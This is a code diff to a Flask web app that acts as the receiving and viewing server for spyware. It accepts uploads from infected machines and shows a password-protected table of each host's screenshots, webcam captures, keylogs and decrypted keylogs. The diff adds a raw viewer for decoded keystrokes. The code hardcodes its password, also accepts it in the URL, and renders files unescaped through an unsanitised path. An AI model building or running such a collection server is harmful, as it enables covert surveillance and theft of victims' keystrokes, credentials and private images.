@@ -1,5 +1,5 @@
 import os
-from flask import Flask, request, send_from_directory, render_template_string
+from flask import Flask, request, send_from_directory, render_template_string, Response
 from werkzeug.utils import secure_filename
 from datetime import datetime
 import pytz
@@ -8,7 +8,8 @@ UPLOAD_ROOT = "logs"
 PASSWORD = "disha456"
 
 app = Flask(__name__)
-os.makedirs(UPLOAD_ROOT, exist_ok=True)
+if not os.path.exists(UPLOAD_ROOT):
+    os.makedirs(UPLOAD_ROOT)
 
 COLUMNS = [
     "Hostname", "Timestamp", "Desktop Screenshot", "Webcam", "Keylogs",
@@ -34,13 +35,13 @@ HTML_TEMPLATE = '''
 </head>
 <body>
   {% if not authed %}
-    <h2>Enter Password to Access Logs</h2>
+    <h2>🔐 Enter Password to Access Logs</h2>
     <form method="POST">
       <input type="password" name="password" placeholder="Enter password"/>
       <button type="submit">Login</button>
     </form>
   {% else %}
-    <center><h2>Log Viewer (Live Feed)</h2></center>
+    <center><h2> Log Viewer (Live Feed)</h2></center>
     <table>
       <tr>
         {% for col in columns %}
@@ -51,8 +52,16 @@ HTML_TEMPLATE = '''
         <tr>
           <td>{{ folder.hostname }}</td>
           <td>{{ folder.timestamp }}</td>
-          {% for file in folder.files %}
-            <td>{% if file %}<a href="{{ file }}">📥 View/Download</a>{% else %}-{% endif %}</td>
+          {% for idx, file in enumerate(folder.files) %}
+            <td>
+              {% if file %}
+                {% if idx == 5 %} {# Decoded Keylogs #}
+                  <a href="/view/{{ folder.raw_folder }}/{{ folder.raw_files[idx] }}">View</a>
+                {% else %}
+                  <a href="{{ file }}">📥 View/Download</a>
+                {% endif %}
+              {% else %}-{% endif %}
+            </td>
           {% endfor %}
         </tr>
       {% endfor %}
@@ -65,9 +74,8 @@ HTML_TEMPLATE = '''
 @app.route("/", methods=["GET", "POST"])
 def index():
     authed = False
-    if request.method == "POST":
-        if request.form.get("password") == PASSWORD:
-            authed = True
+    if request.method == "POST" and request.form.get("password") == PASSWORD:
+        authed = True
     elif request.args.get("access") == PASSWORD:
         authed = True
 
@@ -75,58 +83,81 @@ def index():
     if authed:
         for folder in sorted(os.listdir(UPLOAD_ROOT), reverse=True):
             full_path = os.path.join(UPLOAD_ROOT, folder)
-            if os.path.isdir(full_path):
-                # Convert folder name timestamp to IST format
+            if not os.path.isdir(full_path): continue
+
+            # Convert timestamp folder name to IST
+            try:
+                dt = datetime.strptime(folder, "%Y-%m-%d_%H-%M-%S")
+                utc = pytz.utc.localize(dt)
+                ist = utc.astimezone(pytz.timezone('Asia/Kolkata'))
+                ts = ist.strftime("%H:%M:%S__%d:%m:%Y")
+            except:
+                ts = folder
+
+            # Gather file entries
+            files = []
+            raw_files = []
+            for col in COLUMNS[2:]:
+                norm = col.lower().replace(" ", "_")
+                if col == "Decoded Keylogs":
+                    norm = "decrypted_keylogs"
+                match = next((f for f in os.listdir(full_path) if norm in f.lower()), None)
+                if match:
+                    files.append(f"/download/{folder}/{match}")
+                    raw_files.append(match)
+                else:
+                    files.append(None)
+                    raw_files.append("")
+
+            # Extract hostname
+            hostname = ""
+            act = next((f for f in os.listdir(full_path) if "activity_log" in f.lower()), None)
+            if act:
                 try:
-                    dt = datetime.strptime(folder, "%Y-%m-%d_%H-%M-%S")
-                    utc = pytz.utc.localize(dt)
-                    ist = utc.astimezone(pytz.timezone('Asia/Kolkata'))
-                    formatted_timestamp = ist.strftime("%H:%M:%S__%d:%m:%Y")
+                    with open(os.path.join(full_path, act), encoding="utf-8") as f:
+                        for line in f:
+                            if "Computer Name:" in line:
+                                hostname = line.split(":",1)[1].strip()
+                                break
                 except:
-                    formatted_timestamp = folder
+                    hostname = "Unknown"
+            if not hostname:
+                hostname = folder.split("_")[0]
 
-                row = {"hostname": "", "timestamp": formatted_timestamp, "files": []}
-
-                for col in COLUMNS[2:]:
-                    matched = False
-                    for f in os.listdir(full_path):
-                        normalized = col.lower().replace(" ", "_")
-                        if normalized in f.lower():
-                            file_path = os.path.join(full_path, f)
-                            row["files"].append(f"/download/{folder}/{f}")
-                            matched = True
-                            break
-                    if not matched:
-                        row["files"].append(None)
-
-                # Extract hostname from activity_log.txt
-                activity_log_file = next((f for f in os.listdir(full_path) if "activity_log" in f.lower()), None)
-                if activity_log_file:
-                    try:
-                        with open(os.path.join(full_path, activity_log_file), "r", encoding="utf-8") as f:
-                            for line in f:
-                                if "Computer Name:" in line:
-                                    row["hostname"] = line.split(":", 1)[1].strip()
-                                    break
-                    except:
-                        row["hostname"] = "Unknown"
-
-                if not row["hostname"]:
-                    row["hostname"] = folder.split("_")[0]
-                log_entries.append(row)
+            log_entries.append({
+                "hostname": hostname,
+                "timestamp": ts,
+                "files": files,
+                "raw_folder": folder,
+                "raw_files": raw_files
+            })
 
     return render_template_string(HTML_TEMPLATE, authed=authed, columns=COLUMNS, logs=log_entries)
 
 @app.route("/api/receive", methods=["POST"])
 def receive():
-    folder_name = datetime.utcnow().strftime("%Y-%m-%d_%H-%M-%S")
-    save_dir = os.path.join(UPLOAD_ROOT, folder_name)
+    from werkzeug.utils import secure_filename
+    timestamp = datetime.utcnow().strftime("%Y-%m-%d_%H-%M-%S")
+    save_dir = os.path.join(UPLOAD_ROOT, timestamp)
     os.makedirs(save_dir, exist_ok=True)
     for f in request.files.values():
-        filename = secure_filename(f.filename)
-        f.save(os.path.join(save_dir, filename))
+        fn = secure_filename(f.filename)
+        f.save(os.path.join(save_dir, fn))
     return "Logs received"
 
 @app.route("/download/<folder>/<filename>")
 def download(folder, filename):
     return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename)
+
+@app.route("/view/<folder>/<filename>")
+def view(folder, filename):
+    path = os.path.join(UPLOAD_ROOT, folder, filename)
+    if not os.path.exists(path):
+        return "Not Found", 404
+    return Response(
+        f"<pre style='background:black;color:lime;'>{open(path, 'r', encoding='utf-8', errors='ignore').read()}</pre>",
+        mimetype="text/html"
+    )
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
